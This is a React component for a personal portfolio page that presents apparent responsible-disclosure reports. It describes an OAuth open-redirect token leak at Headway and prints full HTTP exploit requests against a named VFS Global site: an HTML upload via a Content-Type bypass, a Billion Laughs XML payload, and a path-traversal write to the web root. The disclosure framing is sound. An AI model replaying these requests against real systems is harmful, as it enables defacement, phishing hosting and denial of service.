import React, { useEffect, useRef, useState } from 'react';

/* ======== HEADWAY DATA ======== */
const headwayEmailTimeline = [
  { date: 'Jun 9, 2026', sender: 'Paul Uhunoma', direction: 'sent', summary: 'Initial responsible disclosure email sent to Headway security team, requesting a secure channel to share vulnerability details.' },
  { date: 'Jun 9, 2026', sender: 'Angie — Head of HW Care', direction: 'received', summary: 'Angie responded promptly, requesting full vulnerability details for the IT team to review.' },
  { date: 'Jun 9, 2026', sender: 'Paul Uhunoma', direction: 'sent', summary: 'Sent the complete Security Vulnerability Report with full technical details, step-by-step PoC, and a proof-of-concept video demonstrating the exploit on hwsoc.com.' },
  { date: 'Jun 10, 2026', sender: 'Angie — Head of HW Care', direction: 'received', summary: 'Confirmed the report was forwarded to the IT department for review.' },
  { date: 'Jun 11, 2026', sender: 'Angie — Head of HW Care', direction: 'received', summary: 'IT team reviewed the report and confirmed changes will be implemented. Offered a $50 reward for the responsible disclosure.' },
  { date: 'Jun 11, 2026', sender: 'Paul Uhunoma', direction: 'sent', summary: 'Accepted the reward and provided bank details. Offered to perform a complimentary re-test once the patch is deployed.' },
  { date: 'Jun 11, 2026', sender: 'Angie — Head of HW Care', direction: 'received', summary: 'Reward of $50 credited to Headway USD wallet for withdrawal. Fast and convenient resolution.' },
  { date: 'Jun 12, 2026', sender: 'Angie — Head of HW Care', direction: 'received', summary: 'Final thank-you and positive close to the responsible disclosure process.' },
];

const headwayScreenshots = [
  { src: '/headway email 1.png', caption: 'Initial disclosure email to Headway' },
  { src: '/headway email 2.png', caption: 'Response from Angie — requesting details' },
  { src: '/headway email 3.png', caption: 'Full vulnerability report sent' },
  { src: '/headway email 4.png', caption: 'Report forwarded to IT team' },
  { src: '/headway email 5.png', caption: 'IT review complete — reward offered' },
  { src: '/headway email 6.png', caption: 'Reward acceptance & bank details' },
  { src: '/headway email 7.png', caption: 'Reward credited to wallet' },
  { src: '/headway email 8.png', caption: 'Withdrawal confirmed & re-test offered' },
  { src: '/headway 9.png', caption: 'Final thank-you from Headway' },
];

const headwayAttackSteps = [
  { step: 1, title: 'Craft Malicious URL', icon: '🔗', desc: 'Attacker nests an external domain inside the OAuth redirect parameter, bypassing domain validation.' },
  { step: 2, title: 'Victim Clicks Link', icon: '🎯', desc: 'Logged-in user navigates to the crafted URL. The backend appends the user\'s live session token (socialToken) to the redirect.' },
  { step: 3, title: 'Token Leaked', icon: '🔓', desc: 'User is redirected to the attacker\'s domain with their active socialToken exposed in the URL.' },
  { step: 4, title: 'Account Takeover', icon: '💀', desc: 'Attacker uses the stolen socialToken to log into the victim\'s account — full access without credentials.' },
];

/* ======== VFS GLOBAL DATA ======== */
const vfsVulnerabilities = [
  {
    title: 'Unrestricted File Upload via Content-Type Bypass',
    severity: 'HIGH',
    desc: 'The upload endpoint accepts files with any Content-Type header. By changing Content-Type to text/html, an attacker can upload malicious HTML files that are served directly by the server. These files can be used to host phishing pages, steal user credentials, or execute JavaScript in the context of the trusted domain.',
    endpoint: '/CustomerFeedback/GeneralFeedback/UploadFiles/',
    proof: 'Uploaded hacked1.html was accessible at: /CustomerFeedback/uploads/hacked1.html',
    code: `POST /CustomerFeedback/GeneralFeedback/UploadFiles/ HTTP/2
Host: www.vfsglobalcustomerexperience.com
Cookie: .AspNetCore.Antiforgery.cFTIh2oyc2M=CfDJ8JtYBXj_...
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1sybpdBdHJt2iBml
X-Requested-With: XMLHttpRequest

------WebKitFormBoundary1sybpdBdHJt2iBml
Content-Disposition: form-data; name="files"; filename="hacked1.html"
Content-Type: text/html; charset=utf-8

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
</head>
<body>
    paul
    <script>
        const myIframe = document.createElement('iframe');
        myIframe.src = './hacked1.html';
        myIframe.width = '100%';
        myIframe.height = '600px';
        myIframe.sandbox = 'allow-scripts allow-same-origin';
        document.body.appendChild(myIframe);
    </script>
</body>
</html>
------WebKitFormBoundary1sybpdBdHJt2iBml--

HTTP/2 200 OK

[{"fileName":"","filePath":"/upload/hacked1.html","fileType":".html","size":245}]`,
  },
  {
    title: 'XML Billion Laughs (DoS via Entity Expansion)',
    severity: 'HIGH',
    desc: 'The upload endpoint also accepts XML files without restricting external entity processing. An attacker can craft a Billion Laughs payload (recursive entity expansion) which causes the XML parser to consume exponential memory and CPU, potentially crashing the server or causing a Denial-of-Service condition.',
    endpoint: '/CustomerFeedback/GeneralFeedback/UploadFiles/',
    proof: 'Uploaded test.xml with entity expansion — server parsed and expanded all entities, confirming vulnerability.',
    code: `POST /CustomerFeedback/GeneralFeedback/UploadFiles/ HTTP/2
Host: www.vfsglobalcustomerexperience.com
Cookie: .AspNetCore.Antiforgery.cFTIh2oyc2M=CfDJ8JtYBXj_...
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1sybpdBdHJt2iBml
X-Requested-With: XMLHttpRequest

------WebKitFormBoundary1sybpdBdHJt2iBml
Content-Disposition: form-data; name="files"; filename="test.xml"
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE bomb [
  <!ENTITY a "AAAAAAAAAA">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
]>
<test>&b;</test>
------WebKitFormBoundary1sybpdBdHJt2iBml--

HTTP/2 200 OK

[{"fileName":"","filePath":"/upload/test.xml","fileType":".xml","size":245}]

// Parsed output confirms entity expansion:
// <test>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</test>`,
  },
  {
    title: 'Path Traversal — File Write to Web Root',
    severity: 'CRITICAL',
    desc: 'By manipulating the filename with path traversal sequences (..\\..\\..\\inetpub\\wwwroot\\), an attacker can write files to the site\'s root directory. This allows placing arbitrary HTML/JS files at any URL on the domain, enabling full site defacement, persistent XSS, or hosting malicious content under the trusted domain.',
    endpoint: '/CustomerFeedback/GeneralFeedback/UploadFiles/',
    proof: 'Uploaded pathhack.html was accessible at the site root: /CustomerFeedback/pathhack.html',
    code: `POST /CustomerFeedback/GeneralFeedback/UploadFiles/ HTTP/2
Host: www.vfsglobalcustomerexperience.com
Cookie: .AspNetCore.Antiforgery.cFTIh2oyc2M=CfDJ8JtYBXj_...
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1sybpdBdHJt2iBml
X-Requested-With: XMLHttpRequest

------WebKitFormBoundary1sybpdBdHJt2iBml
Content-Disposition: form-data; name="files"; filename="..\\..\\..\\inetpub\\wwwroot\\pathhack.html"
Content-Type: text/html; charset=utf-8

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
</head>
<body>
    paul
    <script>
        const myIframe = document.createElement('iframe');
        myIframe.src = './hacked1.html';
        myIframe.width = '100%';
        myIframe.height = '600px';
        myIframe.sandbox = 'allow-scripts allow-same-origin';
        document.body.appendChild(myIframe);
    </script>
</body>
</html>
------WebKitFormBoundary1sybpdBdHJt2iBml--

HTTP/2 200 OK

[{"fileName":"","filePath":"/pathhack.html","fileType":".html","size":245}]

// File accessible at: https://www.vfsglobalcustomerexperience.com/CustomerFeedback/pathhack.html`,
  },
];

/* ======== REUSABLE COMPONENTS ======== */
function AttackFlowPanel({ steps }) {
  return (
    <div className="attack-flow">
      {steps.map((s, i) => (
        <div className="attack-step" key={i}>
          <div className="attack-step-icon">{s.icon}</div>
          <div className="attack-step-number">Step {s.step}</div>
          <h4>{s.title}</h4>
          <p>{s.desc}</p>
        </div>
      ))}
    </div>
  );
}

function EmailTimeline({ emails }) {
  return (
    <div className="sec-email-timeline">
      {emails.map((email, i) => (
        <div className={`sec-email-item ${email.direction}`} key={i}>
          <div className="sec-email-dot" />
          <div className="sec-email-card">
            <div className="sec-email-header">
              <span className="sec-email-date">{email.date}</span>
              <span className={`sec-email-direction ${email.direction}`}>
                {email.direction === 'sent' ? '↗ Sent' : '↙ Received'}
              </span>
            </div>
            <div className="sec-email-sender">{email.sender}</div>
            <p className="sec-email-summary">{email.summary}</p>
          </div>
        </div>
      ))}
    </div>
  );
}

function ScreenshotGallery({ screenshots, onOpen }) {
  return (
    <div className="sec-screenshot-gallery">
      {screenshots.map((img, i) => (
        <div className="sec-screenshot-item" key={i} onClick={() => onOpen(img.src)}>
          <img src={img.src} alt={img.caption} loading="lazy" />
          <div className="sec-screenshot-overlay">
            <span className="sec-screenshot-number">{i + 1}</span>
            <p>{img.caption}</p>
          </div>
        </div>
      ))}
    </div>
  );
}

function VideoBlock({ badge, badgeClass, title, description, videoSrc, extraClass }) {
  return (
    <div className={`sec-video-block ${extraClass || ''}`}>
      <div className="sec-video-header">
        <div className={`sec-video-badge ${badgeClass}`}>
          {badgeClass === 'reported' ? (
            <svg width="14" height="14" viewBox="0 0 16 16" fill="currentColor"><path d="M0 4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V4Zm2-1a1 1 0 0 0-1 1v.217l7 4.2 7-4.2V4a1 1 0 0 0-1-1H2Z"/></svg>
          ) : (
            <svg width="14" height="14" viewBox="0 0 16 16" fill="currentColor"><path d="M8 16A8 8 0 1 0 8 0a8 8 0 0 0 0 16zm.93-9.412-1 4.705c-.07.34.029.533.304.533.194 0 .487-.07.686-.246l-.088.416c-.287.346-.92.598-1.465.598-.703 0-1.002-.422-.808-1.319l.738-3.468c.064-.293.006-.399-.287-.399l-.451.003.082-.381 2.29-.287zM8 5.5a1 1 0 1 1 0-2 1 1 0 0 1 0 2z"/></svg>
          )}
          {badge}
        </div>
        <h3>{title}</h3>
        <p className="sec-video-desc">{description}</p>
      </div>
      <div className="sec-video-player">
        <video controls preload="metadata" playsInline>
          <source src={videoSrc} type="video/mp4" />
          Your browser does not support the video tag.
        </video>
      </div>
    </div>
  );
}

/* ======== MAIN COMPONENT ======== */
function Security() {
  const sectionRef = useRef();
  const [activeReport, setActiveReport] = useState('headway');
  const [expandedPanel, setExpandedPanel] = useState('attack');
  const [lightboxImg, setLightboxImg] = useState(null);
  const [expandedCode, setExpandedCode] = useState(null);

  useEffect(() => {
    if (!sectionRef.current) return;
    const cards = sectionRef.current.querySelectorAll('.sec-animate');
    const observer = new IntersectionObserver(
      (entries) => {
        entries.forEach((entry) => {
          if (entry.isIntersecting) entry.target.classList.add('sec-visible');
        });
      },
      { threshold: 0.08 }
    );
    cards.forEach((card) => observer.observe(card));
    return () => observer.disconnect();
  }, [activeReport]);

  // Reset expanded panel when switching reports
  useEffect(() => { setExpandedPanel(''); }, [activeReport]);

  return (
    <div id="security" className="security-section" ref={sectionRef}>
      <div className="section-header sec-animate">
        <span className="section-tag">Cybersecurity</span>
        <h1>Security Research</h1>
        <p className="section-subtitle">
          Responsible vulnerability disclosure and independent security research.
        </p>
      </div>

      {/* Report Tabs */}
      <div className="sec-tabs sec-animate">
        <button className={`sec-tab ${activeReport === 'headway' ? 'active' : ''}`} onClick={() => setActiveReport('headway')}>
          <img src="/headwayfavicon.svg" alt="Headway" className="sec-tab-icon-img" />
          <span className="sec-tab-label">Headway</span>
          <span className="sec-tab-badge critical-mini">ATO</span>
        </button>
        <button className={`sec-tab ${activeReport === 'vfsglobal' ? 'active' : ''}`} onClick={() => setActiveReport('vfsglobal')}>
          <img src="/vfs.ico" alt="VFS Global" className="sec-tab-icon-img" />
          <span className="sec-tab-label">VFS Global</span>
          <span className="sec-tab-badge high-mini">MULTI</span>
        </button>
      </div>

      {/* ==================== HEADWAY REPORT ==================== */}
      {activeReport === 'headway' && (
        <div className="sec-report-wrapper">
          <div className="sec-report-card sec-animate">
            <div className="sec-report-header">
              <div className="sec-report-title-row">
                <h2>Headway — Open Redirect Account Takeover</h2>
                <span className="severity-badge critical">CRITICAL</span>
              </div>
              <div className="sec-report-meta">
                <div className="sec-meta-item">
                  <span className="sec-meta-label">Vulnerability Type</span>
                  <span className="sec-meta-value">Account Takeover (ATO) via OAuth Token Leakage</span>
                </div>
                <div className="sec-meta-item">
                  <span className="sec-meta-label">Affected Domains</span>
                  <span className="sec-meta-value">
                    <span className="code-text">hwsoc.com</span>{' '}&amp;{' '}<span className="code-text">hw.online</span>
                  </span>
                </div>
                <div className="sec-meta-item">
                  <span className="sec-meta-label">Target Endpoint</span>
                  <span className="sec-meta-value code-text">/api/auth/v1/redirect-to-social-oauth</span>
                </div>
                <div className="sec-meta-item">
                  <span className="sec-meta-label">Outcome</span>
                  <span className="sec-meta-value outcome-success">
                    <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/></svg>
                    Bug acknowledged · Patch implemented · $50 bounty awarded
                  </span>
                </div>
              </div>
            </div>

            <div className="sec-panels">
              <div className={`sec-panel ${expandedPanel === 'attack' ? 'expanded' : ''}`}>
                <button className="sec-panel-toggle" onClick={() => setExpandedPanel(expandedPanel === 'attack' ? '' : 'attack')}>
                  <span>🎯 Attack Flow</span>
                  <svg className="sec-chevron" width="20" height="20" viewBox="0 0 20 20" fill="currentColor"><path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z"/></svg>
                </button>
                {expandedPanel === 'attack' && (
                  <div className="sec-panel-content"><AttackFlowPanel steps={headwayAttackSteps} /></div>
                )}
              </div>
              <div className={`sec-panel ${expandedPanel === 'impact' ? 'expanded' : ''}`}>
                <button className="sec-panel-toggle" onClick={() => setExpandedPanel(expandedPanel === 'impact' ? '' : 'impact')}>
                  <span>💥 Impact Summary</span>
                  <svg className="sec-chevron" width="20" height="20" viewBox="0 0 20 20" fill="currentColor"><path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z"/></svg>
                </button>
                {expandedPanel === 'impact' && (
                  <div className="sec-panel-content">
                    <div className="impact-grid">
                      <div className="impact-item"><div className="impact-icon">🔐</div><h4>Full Account Compromise</h4><p>An attacker can completely take over any Headway user account via a single crafted link — no credentials required.</p></div>
                      <div className="impact-item"><div className="impact-icon">👤</div><h4>Personal Data Exposure</h4><p>Full access to the victim's trading profile, personal data, and all account functions.</p></div>
                      <div className="impact-item"><div className="impact-icon">⚡</div><h4>Zero-Click After Auth</h4><p>Once the victim clicks the link and authenticates with Google, the token is leaked automatically.</p></div>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>

          {/* Email Timeline */}
          <div className="sec-timeline-section sec-animate">
            <h2 className="sec-timeline-title">
              <svg width="20" height="20" viewBox="0 0 16 16" fill="currentColor"><path d="M0 4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V4Zm2-1a1 1 0 0 0-1 1v.217l7 4.2 7-4.2V4a1 1 0 0 0-1-1H2Zm13 2.383-4.708 2.825L15 11.105V5.383Zm-.034 6.876-5.64-3.471L8 9.583l-1.326-.795-5.64 3.47A1 1 0 0 0 2 13h12a1 1 0 0 0 .966-.741ZM1 11.105l4.708-2.897L1 5.383v5.722Z"/></svg>
              Responsible Disclosure Timeline
            </h2>
            <EmailTimeline emails={headwayEmailTimeline} />
          </div>

          {/* Videos */}
          <div className="sec-evidence sec-animate">
            <h2 className="sec-evidence-title">
              <svg width="20" height="20" viewBox="0 0 16 16" fill="currentColor"><path d="M0 12V4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2zm6.79-6.907A.5.5 0 0 0 6 5.5v5a.5.5 0 0 0 .79.407l3.5-2.5a.5.5 0 0 0 0-.814l-3.5-2.5z"/></svg>
              Proof of Concept Videos
            </h2>
            <VideoBlock badge="Submitted to Headway" badgeClass="reported" title="hwsoc.com — Original Vulnerability Report" description={<>This is the original PoC video demonstrating the Open Redirect Account Takeover on <span className="code-text">hwsoc.com</span>. Attached to the initial disclosure on June 9, 2026.</>} videoSrc="/headway vulnerability.mp4" />
            <VideoBlock badge="Discovered After Bounty" badgeClass="discovered" title="hw.online — Same Vulnerability, Different Domain" description={<>After receiving the $50 bounty, I discovered the same vulnerability on <span className="code-text">hw.online</span>, confirming the endpoint was shared across multiple Headway properties.</>} videoSrc="/headway final vulnerability.mp4" extraClass="additional-finding" />
          </div>

          {/* Screenshots */}
          <div className="sec-screenshots sec-animate">
            <h2 className="sec-evidence-title">
              <svg width="20" height="20" viewBox="0 0 16 16" fill="currentColor"><path d="M6.002 5.5a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0z"/><path d="M2.002 1a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2h-12zm12 1a1 1 0 0 1 1 1v6.5l-3.777-1.947a.5.5 0 0 0-.577.093l-3.71 3.71-2.66-1.772a.5.5 0 0 0-.63.062L1.002 12V3a1 1 0 0 1 1-1h12z"/></svg>
              Email Screenshots
            </h2>
            <ScreenshotGallery screenshots={headwayScreenshots} onOpen={setLightboxImg} />
          </div>
        </div>
      )}

      {/* ==================== VFS GLOBAL REPORT ==================== */}
      {activeReport === 'vfsglobal' && (
        <div className="sec-report-wrapper">
          <div className="sec-report-card sec-animate">
            <div className="sec-report-header">
              <div className="sec-report-title-row">
                <h2>VFS Global — Multiple Critical Upload Vulnerabilities</h2>
                <span className="severity-badge critical">CRITICAL</span>
              </div>
              <div className="sec-report-meta">
                <div className="sec-meta-item">
                  <span className="sec-meta-label">Target</span>
                  <span className="sec-meta-value code-text">vfsglobalcustomerexperience.com</span>
                </div>
                <div className="sec-meta-item">
                  <span className="sec-meta-label">Vulnerable Endpoint</span>
                  <span className="sec-meta-value code-text">/CustomerFeedback/GeneralFeedback/UploadFiles/</span>
                </div>
                <div className="sec-meta-item">
                  <span className="sec-meta-label">Vulnerabilities Found</span>
                  <span className="sec-meta-value">3 distinct vulnerabilities in the file upload functionality</span>
                </div>
                <div className="sec-meta-item">
                  <span className="sec-meta-label">Platform</span>
                  <span className="sec-meta-value">ASP.NET Core on IIS (Windows Server)</span>
                </div>
              </div>
            </div>
          </div>

          {/* Individual vulnerabilities */}
          <div className="vfs-vulns sec-animate">
            {vfsVulnerabilities.map((vuln, i) => (
              <div className="vfs-vuln-card" key={i}>
                <div className="vfs-vuln-header">
                  <span className="vfs-vuln-num">0{i + 1}</span>
                  <div>
                    <h3>{vuln.title}</h3>
                    <span className={`severity-badge ${vuln.severity.toLowerCase()}`}>{vuln.severity}</span>
                  </div>
                </div>
                <p className="vfs-vuln-desc">{vuln.desc}</p>
                <div className="vfs-vuln-details">
                  <div className="vfs-detail">
                    <span className="vfs-detail-label">Endpoint</span>
                    <span className="code-text">{vuln.endpoint}</span>
                  </div>
                  <div className="vfs-detail">
                    <span className="vfs-detail-label">Proof</span>
                    <span className="sec-meta-value">{vuln.proof}</span>
                  </div>
                </div>
                {vuln.code && (
                  <div className="vfs-code-section">
                    <button className="vfs-code-toggle" onClick={() => setExpandedCode(expandedCode === i ? null : i)}>
                      <span>{expandedCode === i ? '⟨/⟩ Hide' : '⟨/⟩ View'} Exploit Code</span>
                      <svg className={`sec-chevron ${expandedCode === i ? 'rotated' : ''}`} width="16" height="16" viewBox="0 0 20 20" fill="currentColor"><path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z"/></svg>
                    </button>
                    {expandedCode === i && (
                      <div className="vfs-code-block">
                        <pre><code>{vuln.code}</code></pre>
                      </div>
                    )}
                  </div>
                )}
              </div>
            ))}
          </div>

          {/* Impact summary for VFS */}
          <div className="sec-report-card sec-animate" style={{marginTop: '1.5rem'}}>
            <div className="sec-panels">
              <div className={`sec-panel ${expandedPanel === 'vfs-impact' ? 'expanded' : ''}`}>
                <button className="sec-panel-toggle" onClick={() => setExpandedPanel(expandedPanel === 'vfs-impact' ? '' : 'vfs-impact')}>
                  <span>💥 Combined Impact</span>
                  <svg className="sec-chevron" width="20" height="20" viewBox="0 0 20 20" fill="currentColor"><path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z"/></svg>
                </button>
                {expandedPanel === 'vfs-impact' && (
                  <div className="sec-panel-content">
                    <div className="impact-grid">
                      <div className="impact-item"><div className="impact-icon">📄</div><h4>Arbitrary File Upload</h4><p>Attacker can upload malicious HTML/JS files to the server by bypassing Content-Type validation, hosting phishing pages on the trusted domain.</p></div>
                      <div className="impact-item"><div className="impact-icon">💣</div><h4>Denial of Service</h4><p>XML Billion Laughs payload causes exponential memory consumption, potentially crashing the server or degrading service for all users.</p></div>
                      <div className="impact-item"><div className="impact-icon">🗂️</div><h4>Web Root Write Access</h4><p>Path traversal allows writing files to the IIS web root, enabling site defacement, persistent XSS, or malware hosting under a trusted domain.</p></div>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>

          {/* VFS Video */}
          <div className="sec-evidence sec-animate">
            <h2 className="sec-evidence-title">
              <svg width="20" height="20" viewBox="0 0 16 16" fill="currentColor"><path d="M0 12V4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2zm6.79-6.907A.5.5 0 0 0 6 5.5v5a.5.5 0 0 0 .79.407l3.5-2.5a.5.5 0 0 0 0-.814l-3.5-2.5z"/></svg>
              Proof of Concept Video
            </h2>
            <VideoBlock badge="Vulnerability Demonstration" badgeClass="reported" title="VFS Global — Upload Vulnerabilities PoC" description={<>Demonstration of the Content-Type bypass, XML entity expansion, and path traversal vulnerabilities on <span className="code-text">vfsglobalcustomerexperience.com</span>.</>} videoSrc="/vfsglobal.mp4" />
          </div>
        </div>
      )}

      {/* Lightbox */}
      {lightboxImg && (
        <div className="sec-lightbox" onClick={() => setLightboxImg(null)}>
          <div className="sec-lightbox-content" onClick={(e) => e.stopPropagation()}>
            <button className="sec-lightbox-close" onClick={() => setLightboxImg(null)}>✕</button>
            <img src={lightboxImg} alt="Email screenshot" />
          </div>
        </div>
      )}

      {/* Bugcrowd Profile */}
      <div className="sec-bugcrowd sec-animate">
        <div className="bugcrowd-card">
          <div className="bugcrowd-icon">
            <svg width="40" height="40" viewBox="0 0 24 24" fill="currentColor">
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
            </svg>
          </div>
          <div className="bugcrowd-info">
            <h3>Bugcrowd Profile</h3>
            <p>View my vulnerability reports and security research on Bugcrowd — the world's leading crowdsourced cybersecurity platform.</p>
          </div>
          <a href="https://bugcrowd.com/h/codinplus" target="_blank" rel="noopener noreferrer" className="bugcrowd-btn">
            <svg width="18" height="18" viewBox="0 0 16 16" fill="currentColor"><path fillRule="evenodd" d="M8.636 3.5a.5.5 0 0 0-.5-.5H1.5A1.5 1.5 0 0 0 0 4.5v10A1.5 1.5 0 0 0 1.5 16h10a1.5 1.5 0 0 0 1.5-1.5V7.864a.5.5 0 0 0-1 0V14.5a.5.5 0 0 1-.5.5h-10a.5.5 0 0 1-.5-.5v-10a.5.5 0 0 1 .5-.5h6.636a.5.5 0 0 0 .5-.5z"/><path fillRule="evenodd" d="M16 .5a.5.5 0 0 0-.5-.5h-5a.5.5 0 0 0 0 1h3.793L6.146 9.146a.5.5 0 1 0 .708.708L15 1.707V5.5a.5.5 0 0 0 1 0v-5z"/></svg>
            View Profile
          </a>
        </div>
      </div>
    </div>
  );
}

export default Security;
